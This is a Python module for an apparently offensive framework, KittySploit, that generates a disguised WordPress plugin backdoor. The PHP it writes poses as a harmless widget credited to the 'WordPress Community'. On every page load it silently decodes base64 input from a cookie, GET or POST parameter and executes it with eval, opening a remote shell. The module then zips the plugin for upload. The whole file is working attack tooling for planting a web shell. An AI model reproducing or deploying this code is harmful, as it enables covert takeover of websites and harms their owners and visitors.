from kittysploit import *
import zipfile
import os

class Module(Backdoor):
	
	__info__ = {
		'name': 'WordPress Plugin Backdoor',
		'description': 'Generate a WordPress plugin backdoor that can be installed in wp-content/plugins/',
		'author': 'KittySploit Team',
		'listener': 'listeners/web/php_cookie',
		'session_type': SessionType.PHP,
		'arch': Arch.PHP,
	}

	plugin_name = OptString("kitty_widget", "Plugin name (will be used as directory name)", True)
	cookie_name = OptString("kitty_shell", "Cookie name for shell connection", True)
	method = OptChoice("cookie", "Backdoor activation method", False, ["cookie", "get", "post"])

	def run(self):
		# Generate plugin directory name
		plugin_dir = self.plugin_name
		# Main plugin file should have the same name as the directory
		plugin_file = f"{plugin_dir}/{plugin_dir}.php"
		
		# Build the backdoor code based on method
		if self.method == "cookie":
			backdoor_code = f"""
if(isset($_COOKIE['{self.cookie_name}'])){{
	$data = $_COOKIE['{self.cookie_name}'];
	$decoded = @base64_decode($data);
	if($decoded !== false){{
		@eval($decoded);
	}}
}}"""
		elif self.method == "get":
			backdoor_code = f"""
if(isset($_GET['{self.cookie_name}'])){{
	$data = $_GET['{self.cookie_name}'];
	$decoded = @base64_decode($data);
	if($decoded !== false){{
		@eval($decoded);
	}}
}}"""
		else:  # post
			backdoor_code = f"""
if(isset($_POST['{self.cookie_name}'])){{
	$data = $_POST['{self.cookie_name}'];
	$decoded = @base64_decode($data);
	if($decoded !== false){{
		@eval($decoded);
	}}
}}"""
		
		# WordPress plugin header and structure
		plugin_data = f"""<?php
/**
 * Plugin Name: {self.plugin_name.title()} Widget
 * Plugin URI: https://wordpress.org/plugins/{self.plugin_name}/
 * Description: A simple widget plugin for WordPress. Adds custom functionality to your WordPress site.
 * Version: 1.0.0
 * Author: WordPress Community
 * Author URI: https://wordpress.org/
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: {self.plugin_name}
 */

// Prevent direct access
if (!defined('ABSPATH')) {{
	exit;
}}

/**
 * Initialize the plugin
 */
function {self.plugin_name}_init() {{
	// Register widget
	add_action('widgets_init', function() {{
		register_widget('{self.plugin_name.title()}_Widget');
	}});
}}
add_action('plugins_loaded', '{self.plugin_name}_init');

/**
 * Widget Class
 */
class {self.plugin_name.title()}_Widget extends WP_Widget {{
	
	public function __construct() {{
		parent::__construct(
			'{self.plugin_name}_widget',
			__('{self.plugin_name.title()} Widget', '{self.plugin_name}'),
			array('description' => __('A custom widget for {self.plugin_name.title()}', '{self.plugin_name}'))
		);
	}}
	
	public function widget($args, $instance) {{
		echo $args['before_widget'];
		if (!empty($instance['title'])) {{
			echo $args['before_title'] . apply_filters('widget_title', $instance['title']) . $args['after_title'];
		}}
		echo '<p>' . esc_html__('Widget content goes here.', '{self.plugin_name}') . '</p>';
		echo $args['after_widget'];
	}}
	
	public function form($instance) {{
		$title = !empty($instance['title']) ? $instance['title'] : __('New title', '{self.plugin_name}');
		?>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('title')); ?>"><?php esc_attr_e('Title:', '{self.plugin_name}'); ?></label>
			<input class="widefat" id="<?php echo esc_attr($this->get_field_id('title')); ?>" name="<?php echo esc_attr($this->get_field_name('title')); ?>" type="text" value="<?php echo esc_attr($title); ?>">
		</p>
		<?php
	}}
	
	public function update($new_instance, $old_instance) {{
		$instance = array();
		$instance['title'] = (!empty($new_instance['title'])) ? strip_tags($new_instance['title']) : '';
		return $instance;
	}}
}}

/**
 * Hook into WordPress initialization
 * This ensures the backdoor code runs on every page load
 */
add_action('init', function() {{
	@error_reporting(0);
{backdoor_code}
}}, 0);

/**
 * Activation hook
 */
register_activation_hook(__FILE__, function() {{
	// Plugin activation code
}});

/**
 * Deactivation hook
 */
register_deactivation_hook(__FILE__, function() {{
	// Plugin deactivation code
}});
"""
		
		# Write the plugin file
		self.write_out_dir(plugin_file, plugin_data)
		
		# Create ZIP archive
		output_dir = os.path.join(os.getcwd(), "output")
		plugin_dir_path = os.path.join(output_dir, plugin_dir)
		zip_path = os.path.join(output_dir, f"{plugin_dir}.zip")
		
		# Create ZIP file with proper WordPress plugin structure
		with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
			# Add the main plugin file to the ZIP
			plugin_file_path = os.path.join(output_dir, plugin_file)
			if os.path.exists(plugin_file_path):
				# Add file to ZIP with correct path (plugin_dir/plugin_file.php)
				# This ensures WordPress can find the plugin when extracting
				zipf.write(plugin_file_path, arcname=os.path.join(plugin_dir, f"{plugin_dir}.php"))
		
		print_success(f"WordPress plugin backdoor generated: {zip_path}")
		print_info(f"Plugin directory: {plugin_dir}")
		print_info(f"Main plugin file: {plugin_dir}/{plugin_dir}.php")
		print_info(f"Installation: Upload {os.path.basename(zip_path)} to WordPress admin panel (Plugins > Add New > Upload Plugin)")
		return True

